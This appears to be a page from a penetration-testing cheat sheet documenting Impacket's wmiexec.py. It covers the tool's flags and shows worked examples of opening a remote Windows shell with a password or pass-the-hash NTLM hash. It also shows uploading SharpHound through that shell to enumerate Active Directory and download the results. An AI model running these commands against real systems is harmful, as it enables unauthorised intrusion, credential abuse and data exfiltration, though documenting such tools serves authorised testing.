---
title : "wmiexec.py"
# pre : ' '
description : "Executes a semi-interactive shell using Windows Management Instrumentation."
date : 2022-02-14T12:19:32+01:00
# hidden : true
# draft : true
weight : 160
# tags : ['']
---

---

Executes a semi-interactive shell using Windows Management Instrumentation.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
wmiexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-silentcommand] [-debug] [-codec CODEC] [-shell-type {cmd,powershell}] [-com-version MAJOR_VERSION:MINOR_VERSION] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                  [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-A authfile] [-keytab KEYTAB]
                  target [command ...]
```

## Flags

```plain
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

Executes a semi-interactive shell using Windows Management Instrumentation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command to execute at the target. If empty it will launch a semi-interactive shell

optional arguments:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default ADMIN$)
  -nooutput             whether or not to print the output (no SMB connection created)
  -ts                   Adds timestamp to every logging output
  -silentcommand        does not execute cmd.exe to run given command (no output)
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py again with -codec and the corresponding codec
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive shell
  -com-version MAJOR_VERSION:MINOR_VERSION
                        DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -A authfile           smbclient/mount.cifs-style authentication file. See smbclient man page's -A option.
```

## Examples

### Enter as the user, not SYSTEM

```plain
$ wmiexec.py offsec.nl/administrator:Welkom1234@10.10.10.16

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
offsec\administrator
```

### Enter with hash instead of password

```plain
wmiexec.py administrator@10.10.10.16 -hashes :0e0363213e37b94221497260b0bcb4fc Impacket v0.9.24.dev1+20210726.180101.1636eaab - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

### Use SharpHound in wmiexec.py

```plain
$ wmiexec.py admin:Welkom1234@10.10.10.10
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
put[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>put SharpHound.exe
[*] Uploading SharpHound.exe to C:\SharpHound.exe

C:\>SharpHound.exe --CollectionMethod All -d offsec.local --ldapusername johndo --ldappassword Welkom1234 --domaincontroller 10.10.10.10
------------------------------------------------
Initializing SharpHound at 10:59 AM on 11/5/2020
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain offsec.LOCAL using path CN=Schema,CN=Configuration,DC=offsec,DC=LOCAL
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 18 MB RAM
Status: 74 objects finished (+74 74)/s -- Using 26 MB RAM
Enumeration finished in 00:00:01.6392385
Compressing data to .\20201105105903_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 10:59 AM on 11/5/2020! Happy Graphing!


C:\>get 20201105105903_BloodHound.zip
[*] Downloading C:\\20201105105903_BloodHound.zip
```

## URL List

- [Github.com - wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)
